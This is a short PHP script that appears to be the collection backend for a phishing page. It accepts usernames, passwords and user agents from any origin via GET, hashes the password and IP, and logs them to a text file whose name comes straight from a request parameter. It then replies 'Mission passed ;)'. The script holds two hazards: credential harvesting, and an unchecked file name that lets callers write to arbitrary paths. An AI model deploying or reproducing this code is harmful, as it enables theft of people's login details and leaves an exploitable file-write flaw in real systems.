<?php
	header("Access-Control-Allow-Origin: *");
	// header("Access-Control-Allow-Headers: Content-Type");

    date_default_timezone_set("Asia/Kolkata");

    if(!isset($_GET['username']) || !isset($_GET['password']) || !isset($_GET['handle']) || !isset($_GET['userAgent'])){
        die("Failed");
    }

	$username = $_GET["username"];
    $password = hash("sha256",$_GET["password"]);
    $fileName = $_GET["handle"];
    $userAgent = $_GET["userAgent"];
    $IP_ADDR = hash("sha256",$_SERVER['REMOTE_ADDR']);

    $file_data = "";
    $file_data .= file_get_contents("$fileName.txt");

    //data formatting
    $seperator = "=================================";
    $date = date('j, F Y h:i A');

    $file_data = strlen($file_data) > 2000 ? "":$file_data;

    $finalData .= "Date : $date\nUsername: $username\nPassword: $password\nUser Agent: $userAgent\nIP: $IP_ADDR\n$seperator\n";

    file_put_contents("$fileName.txt", $finalData.$file_data);

    echo "Mission passed ;)";

?>